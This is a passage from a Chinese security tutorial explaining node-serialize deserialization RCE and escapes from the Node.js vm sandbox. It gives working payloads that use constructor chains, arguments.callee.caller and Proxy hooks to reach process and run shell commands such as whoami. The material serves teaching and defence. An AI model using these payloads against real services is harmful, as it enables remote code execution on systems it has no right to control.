<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030193224104.png" alt="image-20231030193224104"></p>
<p>其中的关键就是：<code>obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function(){}()</code>函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</p>
<ul>
<li>构造Payload</li>
</ul>
<pre><code class="hljs js">serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">'node-serialize'</span>);
<span class="hljs-keyword">var</span> test = {
 rce : <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'ls /'</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>){<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(stdout)});},
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"序列化生成的 Payload: \n"</span> + serialize.<span class="hljs-title function_">serialize</span>(test));</code></pre>
<p>生成的Payload为：</p>
<pre><code class="hljs js">{<span class="hljs-string">"rce"</span>:<span class="hljs-string">"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}"</span>}</code></pre>
<p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p>
<pre><code class="hljs js">{<span class="hljs-string">"rce"</span>:<span class="hljs-string">"_$$ND_FUNC$$_function(){require('child_process').exec('ls /',function(error, stdout, stderr){console.log(stdout)});}()"</span>}</code></pre>
<p>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</p>
<p>传递给unserialize(注意转义单引号)：</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> serialize = <span class="hljs-built_in">require</span>(<span class="hljs-string">'node-serialize'</span>);
<span class="hljs-keyword">var</span> payload = <span class="hljs-string">'{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr){console.log(stdout)});}()"}'</span>;
serialize.<span class="hljs-title function_">unserialize</span>(payload);</code></pre>
<p>执行命令成功，结果如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030193404903.png" alt="image-20231030193404903"></p>
<h1 id="0x06-vm沙箱逃逸">0x06 vm沙箱逃逸</h1>
<h2 id="61-沙箱逃逸初识">6.1 沙箱逃逸初识</h2>
<p>说到沙箱逃逸，我们先来明确一些基本的概念。</p>
<ul>
<li>JavaScript和Nodejs之间有什么区别：JavaScript用在浏览器前端，后来将Chrome中的v8引擎单独拿出来为JavaScript单独开发了一个运行环境，因此JavaScript也可以作为一门后端语言，写在后端（服务端）的JavaScript就叫做Nodejs。</li>
<li>什么是沙箱（sandbox）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。</li>
<li>沙箱（sandbox）和 虚拟机（VM）和 容器（Docker）之间的区别：sandbox和VM使用的都是虚拟化技术，但二者间使用的目的不一样。沙箱用来隔离有害程序，而虚拟机则实现了我们在一台电脑上使用多个操作系统的功能。Docker属于sandbox的一种，通过创造一个有边界的运行环境将程序放在里面，使程序被边界困住，从而使程序与程序，程序与主机之间相互隔离开。在实际防护时，使用Docker和sandbox嵌套的方式更多一点，安全性也更高。</li>
<li>在Nodejs中，我们可以通过引入vm模块来创建一个“沙箱”，但其实这个vm模块的隔离功能并不完善，还有很多缺陷，因此Node后续升级了vm，也就是现在的vm2沙箱，vm2引用了vm模块的功能，并在其基础上做了一些优化。</li>
</ul>
<h2 id="62-node将字符串执行为代码">6.2 Node将字符串执行为代码</h2>
<p>我们先来看两个在node中将把字符串执行成代码的方式。</p>
<p><strong>方法一 eval</strong></p>
<p>首先我在目录下创建一个age.txt</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span></code></pre>
<p>创建一个y1.js</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>)

<span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'age.txt'</span>, <span class="hljs-string">'utf-8'</span>)

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)

<span class="hljs-built_in">eval</span>(content)

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030201003485.png" alt="image-20231030201003485"></p>
<p>可以发现我们通过eval执行了一个字符串，但是这种执行方式如果在当前作用域下已经有了同名的age变量，这个程序就会报错。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030201015450.png" alt="image-20231030201015450"></p>
<p>在js中每一个模块都有自己独立的作用域，所以用eval执行字符串代码很容易出现上面的这个问题，我们再看另外一种方法。</p>
<p><strong>方法二：new Function</strong></p>
<p>上面的方法因为模块间的作用域被限制了使用，那么我们考虑一下如果能够自己创建一个作用域是不是就可以更加方便的执行代码呢？new Function的第一个参数是形参名称，第二个参数是函数体。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030201152813.png" alt="image-20231030201152813"></p>
<p>我们都知道函数内和函数外是两个作用域，不过当在函数中的作用域想要使用函数外的变量时，要通过形参来传递，当参数过多时这种方法就变的麻烦起来了。</p>
<p>从上面两个执行代码的例子可以看出来其实我们的思想就是如何创建一个<strong>能够通过传一个字符串就能执行代码，并且还与外部隔绝的作用域</strong>，这也就是vm模块的作用。</p>
<h2 id="63-nodejs作用域">6.3 Nodejs作用域</h2>
<p>说到作用域，我们就要说一下Nodejs中的作用域是怎么分配的（在Nodejs中一般把作用域叫上下文）。</p>
<p>在Web端（浏览器），发挥作用的一般是JavaScript，学过JavaScript的师傅应该都知道我们打开浏览器的窗口是JavaScript中最大的对象<code>window</code>，那么在服务端发挥作用的Nodejs它的构造和JavaScript不太一样。</p>
<p>我们在写一个Nodejs项目时往往要在一个文件里ruquire其他的js文件，这些文件我们都给它们叫做“包”。每一个包都有一个自己的上下文，包之间的作用域是互相隔离不互通的，也就是说就算我在y1.js中require了y2.js，那么我在y1.js中也无法直接调用y2.js中的变量和函数，举个例子。</p>
<p>在同一级目录下有<code>y1.js</code>和<code>y2.js</code>两个文件</p>
<pre><code class="hljs js">y1.<span class="hljs-property">js</span>
<span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span>
y2.<span class="hljs-property">js</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./y1"</span>)

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)</code></pre>
<p>运行y2.js发现报错 <code>age</code> 值为undefined</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030201511642.png" alt="image-20231030201511642"></p>
<p>那么我们想y2中引入并使用y1中的元素应该怎么办呢，Nodejs给我们提供了一个将js文件中元素输出的接口<code>exports</code> ，把y1修改成下面这样：</p>
<pre><code class="hljs js">y1.<span class="hljs-property">js</span>
<span class="hljs-keyword">var</span> age = <span class="hljs-number">20</span>

<span class="hljs-built_in">exports</span>.<span class="hljs-property">age</span> = age</code></pre>
<p>我们再运行y2就可以拿到age的值了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030201547409.png" alt="image-20231030201547409"></p>
<p>我们用图来解释这两个包之间的关系就是</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030201659774.png" alt="image-20231030201659774"></p>
<p>这个时候就有人会问左上角的global是什么？这里就要说到Nodejs中的全局对象了。</p>
<p>刚才我们提到在JavaScript中<code>window</code>是全局对象，浏览器其他所有的属性都挂载在<code>window</code>下，那么在服务端的Nodejs中和<code>window</code>类似的全局对象叫做<code>global</code>，Nodejs下其他的所有属性和包都挂载在这个global对象下。在global下挂载了一些全局变量，我们在访问这些全局变量时不需要用<code>global.xxx</code>的方式来访问，直接用<code>xxx</code>就可以调用这个变量。举个例子，<code>console</code>就是挂载在global下的一个全局变量，我们在用<code>console.log</code>输出时并不需要写成<code>global.console.log</code>，其他常见全局变量还有process（一会逃逸要用到）。</p>
<p>我们也可以手动声明一个全局变量，但全局变量在每个包中都是共享的，所以尽量不要声明全局变量，不然容易导致变量污染。用上面的代码举个例子：</p>
<pre><code class="hljs js">y1.<span class="hljs-property">js</span>
<span class="hljs-variable language_">global</span>.<span class="hljs-property">age</span> = <span class="hljs-number">20</span>
y2.<span class="hljs-property">js</span>
<span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./y1"</span>)

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)</code></pre>
<p>输出：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030201715932.png" alt="image-20231030201715932"></p>
<p>可以发现我这次在y1中并没有使用<code>exports</code>将age导入，并且y2在输出时也没有用<code>a.age</code>，因为此时age已经挂载在global上了，它的作用域已经不在y1中了。</p>
<p>我们输出一下global对象，可以看到age确实挂载在了global上：</p>
<pre><code class="hljs javascript">&lt;ref *<span class="hljs-number">1</span>&gt; <span class="hljs-title class_">Object</span> [<span class="hljs-variable language_">global</span>] {
  <span class="hljs-attr">global</span>: [<span class="hljs-title class_">Circular</span> *<span class="hljs-number">1</span>],
  <span class="hljs-attr">clearInterval</span>: [<span class="hljs-title class_">Function</span>: <span class="hljs-built_in">clearInterval</span>],
  <span class="hljs-attr">clearTimeout</span>: [<span class="hljs-title class_">Function</span>: <span class="hljs-built_in">clearTimeout</span>],
  <span class="hljs-attr">setInterval</span>: [<span class="hljs-title class_">Function</span>: <span class="hljs-built_in">setInterval</span>],
  <span class="hljs-attr">setTimeout</span>: [<span class="hljs-title class_">Function</span>: <span class="hljs-built_in">setTimeout</span>] {
    [<span class="hljs-title class_">Symbol</span>(nodejs.<span class="hljs-property">util</span>.<span class="hljs-property">promisify</span>.<span class="hljs-property">custom</span>)]: [<span class="hljs-title class_">Getter</span>]
  },
  <span class="hljs-attr">queueMicrotask</span>: [<span class="hljs-title class_">Function</span>: queueMicrotask],
  <span class="hljs-attr">performance</span>: <span class="hljs-title class_">Performance</span> {
    <span class="hljs-attr">nodeTiming</span>: <span class="hljs-title class_">PerformanceNodeTiming</span> {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'node'</span>,
      <span class="hljs-attr">entryType</span>: <span class="hljs-string">'node'</span>,
      <span class="hljs-attr">startTime</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">duration</span>: <span class="hljs-number">25.98190000653267</span>,
      <span class="hljs-attr">nodeStart</span>: <span class="hljs-number">0.4919999986886978</span>,
      <span class="hljs-attr">v8Start</span>: <span class="hljs-number">2.0012000054121017</span>,
      <span class="hljs-attr">bootstrapComplete</span>: <span class="hljs-number">18.864999994635582</span>,
      <span class="hljs-attr">environment</span>: <span class="hljs-number">10.277099996805191</span>,
      <span class="hljs-attr">loopStart</span>: -<span class="hljs-number">1</span>,
      <span class="hljs-attr">loopExit</span>: -<span class="hljs-number">1</span>,
      <span class="hljs-attr">idleTime</span>: <span class="hljs-number">0</span>
    },
    <span class="hljs-attr">timeOrigin</span>: <span class="hljs-number">1665558311872.296</span>
  },
  <span class="hljs-attr">clearImmediate</span>: [<span class="hljs-title class_">Function</span>: clearImmediate],
  <span class="hljs-attr">setImmediate</span>: [<span class="hljs-title class_">Function</span>: setImmediate] {
    [<span class="hljs-title class_">Symbol</span>(nodejs.<span class="hljs-property">util</span>.<span class="hljs-property">promisify</span>.<span class="hljs-property">custom</span>)]: [<span class="hljs-title class_">Getter</span>]
  },
  <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>
}</code></pre>
<h2 id="64-vm沙箱逃逸">6.4 vm沙箱逃逸</h2>
<p>我们在前面提到了作用域这个概念，所以我们现在思考一下，如果想要实现沙箱的隔离作用，我们是不是可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。</p>
<ul>
<li><code>vm.runinThisContext(code)</code>：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030202109219.png" alt="image-20231030202109219"></p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">let</span> localVar = <span class="hljs-string">'initial value'</span>;
<span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">'localVar = "vm";'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'vmResult:'</span>, vmResult);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'localVar:'</span>, localVar);
<span class="hljs-comment">// vmResult: 'vm', localVar: 'initial value'</span></code></pre>
<ul>
<li><code>vm.createContext([sandbox])</code>： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。</li>
<li><code>vm.runInContext(code, contextifiedSandbox[, options])</code>：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030204648215.png" alt="image-20231030204648215"></p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);
  <span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
  <span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span> = <span class="hljs-number">3</span>;
  <span class="hljs-keyword">const</span> sandbox = { <span class="hljs-attr">globalVar</span>: <span class="hljs-number">1</span> };
  vm.<span class="hljs-title function_">createContext</span>(sandbox);
  vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">'globalVar *= 2;'</span>, sandbox);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox)); <span class="hljs-comment">// { globalVar: 2 }</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(globalVar)); <span class="hljs-comment">// 3</span></code></pre>
<ul>
<li>
<p><code>vm.runInNewContext(code[, sandbox][, options])</code>: creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。</p>
</li>
<li>
<p><code>vm.Script类</code> vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。</p>
</li>
<li>
<p><code>new vm.Script(code, options)</code>：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。<br>
code：要被解析的JavaScript代码</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> util = <span class="hljs-built_in">require</span>(<span class="hljs-string">'util'</span>);
<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> sandbox = {
<span class="hljs-attr">animal</span>: <span class="hljs-string">'cat'</span>,
<span class="hljs-attr">count</span>: <span class="hljs-number">2</span>
};
<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">'count += 1; name = "kitty";'</span>);
<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);
script.<span class="hljs-title function_">runInContext</span>(context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(util.<span class="hljs-title function_">inspect</span>(sandbox));
<span class="hljs-comment">// { animal: 'cat', count: 3, name: 'kitty' }</span></code></pre>
<p>script对象可以通过runInXXXContext运行。</p>
</li>
</ul>
<p>我们一般进行沙箱逃逸最后都是进行rce，那么在Nodejs里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在<code>creatContext</code>后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。</p>
<p>如果我们把代码改成这样（code参数最好用反引号包裹，这样可以使code更严格便于执行）：</p>
<pre><code class="hljs js"><span class="hljs-meta">"use strict"</span>;
<span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);
<span class="hljs-keyword">const</span> y1 = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor('return process.env')()`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y1);</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030205253645.png" alt="image-20231030205253645"></p>
<pre><code class="hljs js">vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor('return process.env')()`</span>);</code></pre>
<p>那么我们是怎么实现逃逸的呢，首先这里面的this指向的是当前传递给<code>runInNewContext</code>的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的<code>()</code>是调用这个用Function的constructor生成的函数，最终返回了一个process对象。</p>
<p>下面这行代码也可以达到相同的效果：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> y1 = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.toString.constructor('return process')()`</span>);</code></pre>
<p>然后我们就可以通过返回的process对象来rce了</p>
<pre><code class="hljs js">y1.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">'whoami'</span>).<span class="hljs-title function_">toString</span>()</code></pre>
<p>这里知识星球上提到了一个问题，下面这段代码：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> script = <span class="hljs-string">`m + n`</span>;
<span class="hljs-keyword">const</span> sandbox = { <span class="hljs-attr">m</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">n</span>: <span class="hljs-number">2</span> };
<span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);
<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res)</code></pre>
<p>我们能不能把<code>this.toString.constructor('return process')()</code>中的this换成{}呢？ {}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。</p>
<p>如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。</p>
<p>我们将mn改成其他类型就可以利用了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030205601565.png" alt="image-20231030205601565"></p>
<h2 id="65-vm沙箱逃逸的一些其他情况">6.5 vm沙箱逃逸的一些其他情况</h2>
<p>知识星球里提到了这样的情况：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> script = <span class="hljs-string">`...`</span>;
<span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);
<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello '</span> + res)</code></pre>
<p>我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性<code>arguments.callee.caller</code>，它可以返回函数的调用者。</p>
<p>我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的<code>arguments.callee.caller</code>就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030210210157.png" alt="image-20231030210210157"></p>
<p>我们分析一下这段代码</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> script = 
<span class="hljs-string">`(() =&gt; {</span>
<span class="hljs-string">    const a = {}</span>
<span class="hljs-string">    a.toString = function () {</span>
<span class="hljs-string">      const cc = arguments.callee.caller;</span>
<span class="hljs-string">      const p = (cc.constructor.constructor('return process'))();</span>
<span class="hljs-string">      return p.mainModule.require('child_process').execSync('whoami').toString()</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">    return a</span>
<span class="hljs-string">  })()`</span>;

<span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);
<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Hello '</span> + res)</code></pre>
<p>我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过<code>arguments.callee.caller</code>获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。</p>
<p>如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用<code>Proxy</code>来劫持属性</p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904090116292616">Proxy 和 Reflect - 掘金 (juejin.cn)</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030210240444.png" alt="image-20231030210240444"></p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);

<span class="hljs-keyword">const</span> script = 
<span class="hljs-string">`</span>
<span class="hljs-string">(() =&gt;{</span>
<span class="hljs-string">    const a = new Proxy({}, {</span>
<span class="hljs-string">        get: function(){</span>
<span class="hljs-string">            const cc = arguments.callee.caller;</span>
<span class="hljs-string">            const p = (cc.constructor.constructor('return process'))();</span>
<span class="hljs-string">            return p.mainModule.require('child_process').execSync('whoami').toString();</span>
<span class="hljs-string">        }</span>
<span class="hljs-string">    })</span>
<span class="hljs-string">    return a</span>
<span class="hljs-string">})()</span>
<span class="hljs-string">`</span>;
<span class="hljs-keyword">const</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-keyword">const</span> context = <span class="hljs-keyword">new</span> vm.<span class="hljs-title function_">createContext</span>(sandbox);
<span class="hljs-keyword">const</span> res = vm.<span class="hljs-title function_">runInContext</span>(script, context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">abc</span>)</code></pre>
<p>触发利用链的逻辑就是我们在<code>get:</code>这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。</p>
<p>如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？</p>
<p>我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030210320245.png" alt="image-20231030210320245"></p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);

<span class="hljs-keyword">const</span> script = 
<span class="hljs-string">`</span>
<span class="hljs-string">    throw new Proxy({}, {</span>
<span class="hljs-string">        get: function(){</span>
<span class="hljs-string">            const cc = arguments.callee.caller;</span>
<span class="hljs-string">            const p = (cc.constructor.constructor('return process'))();</span>
<span class="hljs-string">            return p.mainModule.require('child_process').execSync('whoami').toString();</span>
<span class="hljs-string">        }</span>
<span class="hljs-string">    })</span>
<span class="hljs-string">`</span>;
<span class="hljs-keyword">try</span> {
    vm.<span class="hljs-title function_">runInContext</span>(script, vm.<span class="hljs-title function_">createContext</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)));
}<span class="hljs-keyword">catch</span>(e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"error:"</span> + e) 
}</code></pre>
<p>这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p>
<h2 id="66-vm2">6.6 vm2</h2>
<p>通过上面几个例子可以看出来vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化，我们看一下这些优化具体是怎么实现的。</p>
<p>安装vm2包：</p>
<pre><code class="hljs bash">npm install vm2</code></pre>
<p>整个vm2包下是这样的结构：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030210815548.png" alt="image-20231030210815548"></p>
<ul>
<li><code>cli.js</code>实现了可以在命令行中调用vm2 也就是bin下的vm2。</li>
<li><code>contextify.js</code>封装了三个对象：<code>Contextify Decontextify propertyDescriptor</code>，并且针对global的Buffer类进行了代理。</li>
<li><code>main.js</code> 是vm2执行的入口，导出了<code>NodeVM VM</code>这两个沙箱环境，还有一个<code>VMScript</code>实际上是封装了<code>vm.Script</code>。</li>
<li><code>sandbox.js</code>针对global的一些函数和变量进行了拦截，比如<code>setTimeout，setInterval</code>等</li>
</ul>
<p>vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对<code>constructor和__proto__</code>这些属性的访问。</p>
<p>先用vm2演示一下：</p>
